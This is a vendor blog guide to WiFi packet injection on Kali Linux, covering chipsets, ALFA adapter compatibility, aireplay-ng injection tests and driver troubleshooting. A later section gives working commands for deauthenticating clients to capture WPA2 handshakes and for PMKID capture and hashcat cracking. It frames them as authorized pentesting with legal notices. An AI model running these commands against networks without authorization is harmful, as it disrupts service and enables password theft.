---
title: "What is Packet Injection? Testing Your WiFi Adapter Compatibility with Kali Linux"
description: "Understand WiFi packet injection, why it requires specific adapters, how to test your ALFA Network adapter with aireplay-ng, and which chipsets support injection on Kali Linux."
date: 2026-03-23
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["packet-injection", "aireplay-ng", "kali-linux", "wifi-adapter", "RTL8812AU", "ALFA-Network"]
---

{{< alert "triangle-exclamation" >}}
**Legal Notice:** Packet injection and wireless monitoring must only be performed on networks you own or have explicit written authorization to test. Unauthorized interception of wireless communications is illegal in most jurisdictions. All examples in this guide are for use in **authorized penetration testing and educational lab environments only**.
{{< /alert >}}

## What Is Packet Injection?

Packet injection — formally known as **802.11 frame injection** — is the ability of a wireless adapter to transmit arbitrary 802.11 frames onto a wireless medium, including frames that do not originate from the adapter's own network stack. In normal operation, a wireless driver constructs and transmits only the frames that the OS has legitimately generated: association requests, data frames for connected networks, and so on. Packet injection bypasses these restrictions, allowing a tool like `aireplay-ng` to craft and send any frame type — management, control, or data — with arbitrary content, source addresses, and destination addresses.

This capability is essential for several classes of wireless security assessment:

- **WPA/WPA2 handshake capture acceleration** — Sending deauthentication frames forces clients to re-authenticate, generating a fresh 4-way handshake that can be captured and analyzed offline.
- **WPA handshake verification** — Confirming that a captured handshake file is complete and usable for offline cracking.
- **Replay attacks** — Replaying captured ARP packets to generate IV (initialization vector) traffic for WEP cracking (legacy testing environments).
- **Evil twin / rogue AP construction** — Injecting beacon and probe response frames to simulate access points.
- **DoS testing** — Evaluating how a network responds to deauthentication floods in authorized test conditions.

> **Legal notice:** Packet injection against networks or devices you do not own or have explicit written permission to test is illegal in most jurisdictions. All techniques described in this article are intended solely for authorized penetration testing, security research on your own equipment, and academic study.

---

## Why Most Adapters Cannot Inject Packets

The limitation is not primarily hardware — it is the **driver**. Standard wireless drivers for consumer adapters are written to comply with the 802.11 standard's normal operating model. The driver validates outgoing frames, enforces association state, and rejects frames that do not conform to the expected flow.

To support packet injection, a driver must expose a raw frame transmit path that bypasses these checks. The kernel's **mac80211** subsystem provides this capability through the `IEEE80211_HW_SUPPORTS_RAW_TX` flag, but only if the driver explicitly enables it. Most vendor-supplied drivers for consumer adapters do not enable raw TX — there is no consumer use case that requires it, and enabling it introduces potential for misuse.

Additionally, some chipsets use **proprietary firmware** that handles the MAC layer internally, making it impossible for the host driver to inject arbitrary frames even if the driver wanted to. This is common in Broadcom and Intel chips designed for enterprise or consumer laptops.

---

## Chipsets That Support Packet Injection

The following chipsets have well-established packet injection support on Kali Linux and are used in ALFA Network adapters:

### Realtek RTL8812AU

The most popular chipset for penetration testing as of 2024–2026. Dual-band (2.4/5 GHz), 802.11ac, and supported by the community `rtl8812au` driver maintained in the aircrack-ng GitHub repository. Both monitor mode and injection work reliably.

### Realtek RTL8814AU

The RTL8812AU's bigger sibling: 4×4 MIMO, 802.11ac, dual-band. Supported by the `rtl8814au` driver. Excellent for environments with high AP density where a stronger signal improves capture quality. Full injection support.

### Mediatek MT7612U

Dual-band 802.11ac chipset with a well-maintained in-kernel driver (`mt76`). Monitor mode and injection are supported in the upstream kernel, meaning no out-of-tree driver installation is needed on most current Kali Linux versions.

### Atheros AR9271

A classic single-band (2.4 GHz) chipset with a long history in wireless security tools. The `ath9k_htc` driver is in-kernel and battle-tested. Injection support is solid and consistent across kernel versions. While it only covers 2.4 GHz, it remains a reliable choice for legacy network testing.

### Mediatek MT7921AU (Wi-Fi 6E)

The newest chipset on this list, used in the AWUS036AXML. Supports 2.4/5/6 GHz tri-band with 802.11ax. The `mt7921u` driver requires kernel 5.18 or later. Monitor mode and injection support are confirmed but the driver is newer and may have edge-case issues on older distributions.

---

## Testing Packet Injection with aireplay-ng

Before relying on injection in an actual test, always verify that your specific adapter and driver combination is working correctly. Injection support varies by kernel version and driver revision.

### Prerequisites

Your adapter must already be in monitor mode. If it is not, enable it first:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Confirm the monitor interface exists:

```bash
iwconfig
# Look for: Mode:Monitor
```

### Run the injection test

```bash
sudo aireplay-ng --test wlan0mon
```

### Successful output

```
09:15:34  Trying broadcast probe requests...
09:15:34  Injection is working!
09:15:36  Found 3 APs

09:15:36  Trying directed probe requests...
09:15:36   AA:BB:CC:DD:EE:01 - channel: 6 - 'HomeNetwork'
09:15:37  Ping (min/avg/max): 1.153ms/5.464ms/12.214ms Power: -62
09:15:37  29/30: 96%

09:15:37   AA:BB:CC:DD:EE:02 - channel: 11 - 'OfficeWiFi'
09:15:38  Ping (min/avg/max): 2.101ms/6.322ms/14.881ms Power: -71
09:15:38  28/30: 93%
```

A working injection setup shows **"Injection is working!"** followed by successful ping percentages to nearby access points. Values above 80% are generally reliable. Values below 50% suggest interference, distance issues, or driver problems.

### Failed output

```
09:15:34  Trying broadcast probe requests...
09:15:36  No Answer...
09:15:36  Injection is working! (RTL)
09:15:36  Trying directed probe requests...
09:15:37   AA:BB:CC:DD:EE:01 - channel: 6 - 'HomeNetwork'
09:15:39  Failed!
```

Or, in more complete failure scenarios:

```
09:15:34  Trying broadcast probe requests...
09:15:46  No Answer...
09:15:46  Injection is NOT working!
```

"Injection is NOT working!" is a definitive failure. The adapter either does not support injection or the driver is not properly installed.

---

## ALFA Adapters That Support Packet Injection

All major [ALFA Network](/en/products/alfa/) adapter models support packet injection when used with the correct driver on Kali Linux:

| Model | Chipset | Band | Injection Support |
|---|---|---|---|
| AWUS036ACH | RTL8812AU | 2.4 / 5 GHz | ✅ Full |
| AWUS036AXML | MT7921AU | 2.4 / 5 / 6 GHz | ✅ Full (kernel 5.18+) |
| AWUS036ACM | MT7612U | 2.4 / 5 GHz | ✅ Full |
| AWUS036NHA | AR9271 | 2.4 GHz | ✅ Full |
| AWUS036NH | RTL8187 | 2.4 GHz | ✅ Full |
| AWUS1900 | RTL8814AU | 2.4 / 5 GHz | ✅ Full |

---

## Common Injection Test Failures and Fixes

### "Injection is NOT working!" immediately after starting monitor mode

The most common cause is NetworkManager or wpa_supplicant still running in the background. Kill them and retry:

```bash
sudo airmon-ng check kill
sudo airmon-ng stop wlan0mon
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0mon
```

### Low success percentage (under 50%)

- **Distance:** Move closer to a nearby access point and re-test.
- **Channel mismatch:** Lock your monitor interface to the same channel as the AP you are testing against: `sudo iwconfig wlan0mon channel 6`
- **Driver issues:** Reinstall the out-of-tree driver. For RTL8812AU: clone from `https://github.com/aircrack-ng/rtl8812au` and run `sudo make dkms_install`.

### Kernel module not loading

```bash
sudo modprobe -r rtl8812au
sudo modprobe rtl8812au
dmesg | tail -20
```

Check `dmesg` for error messages about the module. Missing firmware files are a common issue — install `firmware-linux-nonfree` or the chipset-specific firmware package.

### Adapter not appearing after plugging in

```bash
lsusb
dmesg | tail -30
```

If `lsusb` shows the device but no wireless interface appears in `ip link`, the driver failed to bind. This usually means the driver is not installed or the kernel module failed to load.

---

## Use Cases: Applying Injection in Authorized Tests

### WPA2 Handshake Capture

The most common use of injection in professional pentesting. Start capturing on the target AP's channel with airodump-ng, then send deauth frames with aireplay-ng to force a client reconnection:

```bash
# Terminal 1: Capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Deauth (send 5 deauth frames to a specific client)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

Switch back to Terminal 1 and watch for the `WPA handshake: AA:BB:CC:DD:EE:FF` message in the top-right corner of airodump-ng.

### PMKID Attack — No Deauthentication Required

Since 2018, the PMKID attack method allows capturing enough data for offline WPA2 key testing **without sending any deauth frames** — making it significantly stealthier and more effective against networks with few or no connected clients:

```bash
# Install tools
sudo apt install hcxdumptool hcxtools

# Capture PMKID (passive, no deauth)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert for hashcat
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crack offline (does not require active network connection)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### Deauthentication Testing (DoS Assessment)

Security assessors test wireless resilience by sending deauth floods to evaluate whether clients re-associate securely and whether the AP logs or mitigates the attack. Always performed under a signed statement of work.

---

## What This Means for Enterprise Security Teams

Packet injection testing is a standard component of wireless penetration testing engagements. Key use cases for enterprise IT:

- **Rogue AP detection:** Verify whether unauthorized APs are broadcasting on corporate frequencies
- **WPA2 handshake capture audits:** Assess password strength policy compliance
- **PMF (Protected Management Frames) verification:** Confirm that 802.11w is enforced on all enterprise APs — if deauth attacks succeed, PMF is not enabled
- **Client isolation testing:** Ensure client-to-client traffic is blocked on guest networks

For a full enterprise wireless security assessment framework, see [Enterprise Wireless Security Assessment](/en/blog/enterprise-wireless-security-assessment/).

---

## Responsible Use

Packet injection is a powerful capability. Its legitimate applications in authorized penetration testing are well-established — capturing handshakes, verifying wireless security controls, and testing client behavior. Its misuse is both harmful and illegal.

Always ensure you have:
- Written authorization from the network owner before testing
- A clearly scoped statement of work that includes wireless testing
- Awareness of local laws governing wireless security testing

The tools described in this article (aireplay-ng, airodump-ng, aircrack-ng) are included in Kali Linux specifically for authorized security testing. Use them accordingly.

---

For wireless adapters with confirmed packet injection support, browse the [ALFA Network product range at Yopitek](/en/products/alfa/) — Taiwan's authorized ALFA Network distributor.
